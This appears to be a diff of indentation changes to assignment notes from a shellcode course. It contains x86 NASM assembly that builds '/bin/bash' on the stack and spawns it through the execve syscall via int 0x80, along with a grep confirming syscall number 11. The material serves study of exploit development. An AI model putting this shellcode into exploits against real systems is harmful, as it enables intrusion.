@@ -273,24 +273,24 @@ Methodology
     			since we are not passing any arguments and not need of any environemntal value ,they are set to null
 
 
-    	NASM
+    		NASM
 
-    	xor eax,eax
-        push eax
-        push 0x68736162         ////bin/bash in reverse
-        push 0x2f6e6962
-        push 0x2f2f2f2f
-        mov ebx,esp
+    		xor eax,eax
+        	push eax
+        	push 0x68736162         ////bin/bash in reverse
+        	push 0x2f6e6962
+        	push 0x2f2f2f2f
+        	mov ebx,esp
 
-        push eax    # environament value ie ,0
-        push ebx    #pointer to /bin/bash address loc
-        mov ecx,esp
+        	push eax    # environament value ie ,0
+        	push ebx    #pointer to /bin/bash address loc
+        	mov ecx,esp
 
-        mov al,11
-        xor edx,edx #arguments for execve , ie 0
-        int 0x80
+        	mov al,11
+        	xor edx,edx #arguments for execve , ie 0
+        	int 0x80
 
-        EAX = 11 , syscall execve
+        	EAX = 11 , syscall execve
         	toor@ubuntu:~/Desktop/slae/Assignments/1$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 11
 			#define __NR_execve              11
 
